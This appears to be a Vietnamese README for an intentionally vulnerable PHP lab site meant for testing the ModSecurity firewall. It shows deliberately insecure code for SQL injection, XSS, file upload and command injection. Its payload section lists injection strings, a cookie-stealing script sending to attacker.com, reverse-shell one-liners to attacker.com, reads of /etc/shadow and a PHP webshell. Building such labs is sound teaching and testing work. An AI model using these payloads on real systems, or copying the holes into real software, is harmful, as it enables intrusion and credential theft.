# Website Test ModSecurity - Hệ thống Phát hiện và Ngăn chặn Xâm nhập

🔒 **Website có chủ ý chứa lỗ hổng bảo mật để test ModSecurity WAF**

⚠️ **CẢNH BÁO: KHÔNG triển khai website này trên môi trường production!**

---

## 📋 Mục Lục

1. [Giới thiệu](#giới-thiệu)
2. [Các tính năng đã hoàn thành](#các-tính-năng-đã-hoàn-thành)
3. [Cấu trúc thư mục](#cấu-trúc-thư-mục)
4. [Hướng dẫn cài đặt](#hướng-dẫn-cài-đặt)
5. [Lỗ hổng bảo mật](#lỗ-hổng-bảo-mật)
6. [Payload test](#payload-test)
7. [Tài liệu tham khảo](#tài-liệu-tham-khảo)

---

## 🎯 Giới thiệu

Đây là một website PHP đơn giản được thiết kế **CÓ CHỦ ĐÍCH** với nhiều lỗ hổng bảo mật để phục vụ mục đích:

- **Yêu cầu 1**: Website test cho ModSecurity ✅
- **Yêu cầu 2**: Chuẩn bị môi trường để cài đặt ModSecurity
- **Yêu cầu 3**: Chuẩn bị target để test với Nikto, ZAP
- **Yêu cầu 4**: Website có sẵn endpoint test Command Injection

---

## ✅ Các Tính Năng Đã Hoàn Thành

### 1. **Trang Login (index.php)** - SQL Injection
- ✅ Form đăng nhập
- ✅ Lỗ hổng SQL Injection nghiêm trọng
- ✅ Hiển thị SQL query và error message chi tiết
- ✅ Không dùng prepared statements

### 2. **Trang Search (search.php)** - XSS
- ✅ Form tìm kiếm sản phẩm
- ✅ Lỗ hổng Reflected XSS
- ✅ Output trực tiếp user input
- ✅ Hiển thị kết quả từ database

### 3. **Trang Upload (upload.php)** - File Upload
- ✅ Form upload file
- ✅ KHÔNG kiểm tra loại file
- ✅ Cho phép upload bất kỳ file nào
- ✅ Lỗ hổng webshell upload

### 4. **Trang Command (command.php)** - Command Injection ⭐
- ✅ Form ping host/IP
- ✅ Form nslookup domain
- ✅ Form custom command execution
- ✅ Lỗ hổng Command Injection và OS Injection nghiêm trọng
- ✅ **ĐÃ SẴN SÀNG CHO YÊU CẦU 4**

### 5. **Trang Admin (admin.php)**
- ✅ Hiển thị thông tin hệ thống
- ✅ Danh sách users và products
- ✅ Quản lý file đã upload
- ✅ Không có authentication

### 6. **Database Setup (setup.php)**
- ✅ Tạo SQLite database tự động
- ✅ Tạo bảng users và products
- ✅ Insert dữ liệu mẫu
- ✅ Mật khẩu plain-text (không mã hóa)

### 7. **Logout (logout.php)**
- ✅ Đăng xuất và xóa session

### 8. **CSS (style.css)**
- ✅ Giao diện đẹp, hiện đại
- ✅ Responsive design
- ✅ Highlight vulnerability tags

---

## 📁 Cấu Trúc Thư Mục

```
/var/www/html/modsec-test/
├── index.php           # Trang đăng nhập (SQL Injection)
├── search.php          # Trang tìm kiếm (XSS)
├── upload.php          # Trang upload file (Unrestricted Upload)
├── command.php         # Trang thực thi lệnh (Command Injection) ⭐
├── admin.php           # Trang admin (Info Disclosure)
├── setup.php           # Script khởi tạo database
├── logout.php          # Trang đăng xuất
├── style.css           # CSS chung
├── database.db         # SQLite database (tự động tạo)
├── uploads/            # Thư mục chứa file upload
│   └── .htaccess       # Ngăn directory listing
└── README.md           # File này
```

---

## 🚀 Hướng Dẫn Cài Đặt

### Bước 1: Cài đặt Apache và PHP trên Ubuntu

```bash
# Update hệ thống
sudo apt update && sudo apt upgrade -y

# Cài đặt Apache
sudo apt install apache2 -y

# Cài đặt PHP và các module cần thiết
sudo apt install php libapache2-mod-php php-sqlite3 php-cli -y

# Kiểm tra phiên bản
apache2 -v
php -v

# Khởi động Apache
sudo systemctl start apache2
sudo systemctl enable apache2
```

### Bước 2: Triển khai website

```bash
# Tạo thư mục cho website
sudo mkdir -p /var/www/html/modsec-test

# Copy tất cả files vào thư mục
sudo cp -r * /var/www/html/modsec-test/

# Phân quyền
sudo chown -R www-data:www-data /var/www/html/modsec-test
sudo chmod -R 755 /var/www/html/modsec-test

# Tạo thư mục uploads và phân quyền ghi
sudo mkdir -p /var/www/html/modsec-test/uploads
sudo chmod 777 /var/www/html/modsec-test/uploads
```

### Bước 3: Cấu hình Virtual Host (Optional)

```bash
# Tạo file config
sudo nano /etc/apache2/sites-available/modsec-test.conf
```

Nội dung file config:

```apache
<VirtualHost *:80>
    ServerName modsec-test.local
    DocumentRoot /var/www/html/modsec-test
    
    <Directory /var/www/html/modsec-test>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/modsec-test-error.log
    CustomLog ${APACHE_LOG_DIR}/modsec-test-access.log combined
</VirtualHost>
```

Enable site:

```bash
# Enable site
sudo a2ensite modsec-test.conf

# Disable default site (optional)
sudo a2dissite 000-default.conf

# Restart Apache
sudo systemctl restart apache2

# Thêm vào /etc/hosts (nếu dùng local)
echo "127.0.0.1 modsec-test.local" | sudo tee -a /etc/hosts
```

### Bước 4: Khởi tạo Database

```bash
# Truy cập website qua browser
http://localhost/modsec-test/setup.php
# Hoặc
http://modsec-test.local/setup.php

# Script sẽ tự động:
# - Tạo database SQLite
# - Tạo bảng users và products
# - Insert dữ liệu mẫu
```

### Bước 5: Test website

```bash
# Truy cập trang chủ
http://localhost/modsec-test/
# Hoặc
http://modsec-test.local/
```

---

## 🐛 Lỗ Hổng Bảo Mật

### 1. SQL Injection (index.php)

**Mô tả:** Direct string concatenation trong SQL query

**Code lỗi:**
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Nguy hiểm:** Cho phép bypass authentication, truy vấn dữ liệu tùy ý

---

### 2. Reflected XSS (search.php)

**Mô tả:** Output trực tiếp user input không sanitization

**Code lỗi:**
```php
echo "You searched for: <strong>" . $search_query . "</strong>";
```

**Nguy hiểm:** Thực thi JavaScript trong trình duyệt nạn nhân

---

### 3. Arbitrary File Upload (upload.php)

**Mô tả:** Không kiểm tra loại file

**Code lỗi:**
```php
$destination = $upload_dir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $destination);
```

**Nguy hiểm:** Upload webshell PHP, RCE (Remote Code Execution)

---

### 4. Command Injection (command.php) ⭐

**Mô tả:** Thực thi command trực tiếp với user input

**Code lỗi:**
```php
$command = "ping -c 4 " . $_POST['host'];
$output = shell_exec($command);
```

**Nguy hiểm:** 
- Thực thi lệnh tùy ý
- Đọc file hệ thống
- Reverse shell
- Full system compromise

**Đây là mục tiêu chính cho Yêu cầu 4!**

---

## 🧪 Payload Test

### SQL Injection Payloads

```sql
-- Bypass authentication
admin' OR '1'='1
admin' --
' OR 1=1 --
admin' OR '1'='1' --

-- UNION-based injection
admin' UNION SELECT NULL, username, password, email, role FROM users --
' UNION SELECT NULL, NULL, NULL, sqlite_version(), NULL --

-- Blind SQL Injection
admin' AND 1=1 --
admin' AND 1=2 --
```

### XSS Payloads

```javascript
// Basic XSS
<script>alert('XSS')</script>

// Image-based
<img src=x onerror=alert('XSS')>

// SVG-based
<svg onload=alert('XSS')>

// Event handler
<body onload=alert('XSS')>

// iFrame
<iframe src="javascript:alert('XSS')">

// Advanced payload
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

### Command Injection Payloads ⭐

```bash
# Command chaining
google.com; whoami
google.com; cat /etc/passwd
google.com; ls -la /

# AND operator
google.com && id
google.com && uname -a
google.com && cat /etc/shadow

# OR operator
google.com || whoami
google.com || ps aux

# Pipe operator
google.com | ls -la
google.com | cat /etc/hosts

# Command substitution
google.com `whoami`
google.com $(id)
google.com $(cat /etc/passwd)

# Background execution
8.8.8.8 & sleep 10 &

# Reverse shell (NGUY HIỂM!)
google.com; nc -e /bin/bash attacker.com 4444
google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### File Upload Exploits

**PHP Webshell:**

Tạo file `shell.php`:

```php
<?php
// Simple webshell
system($_GET['cmd']);
?>
```

Upload và truy cập:
```
http://localhost/modsec-test/uploads/shell.php?cmd=whoami
http://localhost/modsec-test/uploads/shell.php?cmd=ls -la
```

---

## 📚 Tài Liệu Tham Khảo

### ModSecurity Resources

1. **ModSecurity GitHub:**
   - https://github.com/owasp-modsecurity/ModSecurity
   - Source code chính thức
   - Build từ source

2. **OWASP Core Rule Set:**
   - https://github.com/coreruleset/coreruleset/tree/main/rules
   - Bộ rules chuẩn
   - Protection rules

### Hướng dẫn tiếp theo

**Bước tiếp theo để hoàn thành yêu cầu:**

1. ✅ **Yêu cầu 1 - HOÀN THÀNH:** Website test đã sẵn sàng
2. 🔄 **Yêu cầu 2 - TIẾP THEO:** Cài đặt ModSecurity
3. ⏳ **Yêu cầu 3:** Test với Nikto, ZAP
4. ⏳ **Yêu cầu 4:** Viết custom rule cho Command Injection

---

## 🔐 Default Credentials

### Users Database

| Username | Password | Role |
|----------|----------|------|
| admin | password123 | admin |
| user | user123 | user |
| test | test123 | user |
| john | john2024 | user |
| alice | alice2024 | user |

---

## 🎯 Testing Checklist

- [x] Website hiển thị đúng
- [x] Database khởi tạo thành công
- [x] SQL Injection test thành công
- [x] XSS test thành công
- [x] File upload test thành công
- [x] Command Injection test thành công
- [ ] ModSecurity cài đặt
- [ ] ModSecurity blocking attacks
- [ ] Nikto scan
- [ ] ZAP scan
- [ ] Custom rules cho Command Injection

---

## ⚠️ Lưu Ý Quan Trọng

1. **Website này CÓ CHỦ ĐÍCH chứa lỗ hổng bảo mật**
2. **CHỈ sử dụng trong môi trường lab/testing**
3. **KHÔNG deploy lên Internet**
4. **KHÔNG sử dụng trong production**
5. **Chỉ để học tập và test ModSecurity**

---

## 📞 Hỗ Trợ

Nếu gặp vấn đề:

1. Kiểm tra Apache đã chạy: `sudo systemctl status apache2`
2. Kiểm tra PHP: `php -v`
3. Kiểm tra quyền: `ls -la /var/www/html/modsec-test/`
4. Kiểm tra error log: `sudo tail -f /var/log/apache2/error.log`

---

## 📝 Version History

- **v1.0** - Website cơ bản với các lỗ hổng
  - SQL Injection
  - XSS
  - File Upload
  - Command Injection
  - Admin Panel
  - Database Setup
